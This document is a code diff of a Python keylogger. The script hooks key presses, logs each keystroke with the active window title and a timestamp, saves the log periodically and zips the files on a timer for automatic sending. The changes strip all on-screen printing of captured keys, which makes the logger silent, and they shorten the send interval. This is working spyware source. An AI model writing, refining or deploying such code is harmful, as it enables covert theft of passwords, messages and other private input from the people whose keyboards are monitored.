@@ -4,7 +4,7 @@ import utils.func as f
 
 prevWindow = ''
 future = f.futureTime(1,'int')
-autoSend = f.futureTime(2,'int')
+autoSend = f.futureTime(1,'int')
 memory = ""
 
 def onPress(key):
@@ -13,21 +13,16 @@ def onPress(key):
     checkSave = f.checkFlag(future)
     checkSend = f.checkFlag(autoSend)
     if prevWindow != current:
-        print(f"{current} :: {f.currentTime()} ::")
         memory += f"{current} :: {f.currentTime()} ::\n"
         try:
-            print(f"{key.char}")
             memory+=f"{key.char}\n"
         except AttributeError:
-            print(f"{key}")
             memory+=f"{key}\n"
         prevWindow = current
     else:
         try:
-            print(f"{key.char}")
             memory+=f"{key.char}\n"
         except AttributeError:
-            print(f"{key}")
             memory+=f"{key}\n"
             
     if checkSave:
@@ -37,7 +32,7 @@ def onPress(key):
         
     if checkSend:
         f.zipFiles()
-        autoSend = f.futureTime(2,'int')
+        autoSend = f.futureTime(1,'int')
         
     if key == keyboard.Key.esc:
         return False
